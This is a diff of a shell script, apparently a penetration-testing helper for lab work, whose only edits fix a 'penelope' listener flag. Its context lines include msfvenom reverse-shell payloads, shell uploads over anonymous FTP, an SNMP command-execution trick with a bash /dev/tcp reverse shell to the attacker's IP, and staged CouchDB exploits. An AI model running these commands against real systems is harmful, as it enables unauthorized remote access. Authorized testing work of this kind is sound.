@@ -3082,7 +3082,7 @@ generate_next_steps() {
             "# curl -s -T /tmp/shell.jsp ftp://anonymous:anon@$ip/shell.jsp" \
             "" \
             "# DECIDE: whatweb shows IIS / ASP.NET → ASPX shell instead (start penelope listener FIRST):" \
-            "# On Kali: penelope -0 -p 4444" \
+            "# On Kali: penelope -O -p 4444" \
             "# msfvenom -p windows/shell_reverse_tcp LHOST=\${KALI_IP} LPORT=4444 -f aspx > /tmp/shell.aspx" \
             "# curl -s -T /tmp/shell.aspx ftp://anonymous:anon@$ip/shell.aspx" \
             "" \
@@ -3182,7 +3182,7 @@ generate_next_steps() {
             "snmpset -v2c -c '${community}' $ip 'NET-SNMP-EXTEND-MIB::nsExtendStatus.\"pe\"' i createAndGo 'NET-SNMP-EXTEND-MIB::nsExtendCommand.\"pe\"' s /usr/bin/id 'NET-SNMP-EXTEND-MIB::nsExtendArgs.\"pe\"' s ''" \
             "snmpwalk -v2c -c '${community}' $ip 'NET-SNMP-EXTEND-MIB::nsExtendOutLine.\"pe\"'" \
             "# Reverse shell variant — start listener first, then swap the Command/Args OIDs:" \
-            "#   On Kali: penelope -0 -p 4444" \
+            "#   On Kali: penelope -O -p 4444" \
             "#   Swap Command OID to /bin/bash and Args OID to '-c \"bash -i >& /dev/tcp/\${KALI_IP}/4444 0>&1\"'" \
             "" \
             "# Step 3b — Cisco/network gear → config TFTP push (read startup-config to Kali tftp):" \
@@ -3733,7 +3733,7 @@ COUCHDB_REV
             "CouchDB detected on :5984" \
             "nmap shows :5984 open AND $couchdb_port_dir fingerprint matched CouchDB marker; exploit bodies staged at $couchdb_loot/couchdb_cve-*.json" \
             "# Step 0 — start reverse-shell listener on Kali BEFORE triggering step 3 (AGENTS.md §3 convention):" \
-            "penelope -0 -p 4444" \
+            "penelope -O -p 4444" \
             "# Edit $couchdb_rev_body and replace KALI_IP with your tun0 IP before step 3." \
             "" \
             "# Step 1 — fingerprint version (CVE-2017-12635 affects <1.7.0 and <2.1.1; CVE-2022-24706 needs Erlang port):" \
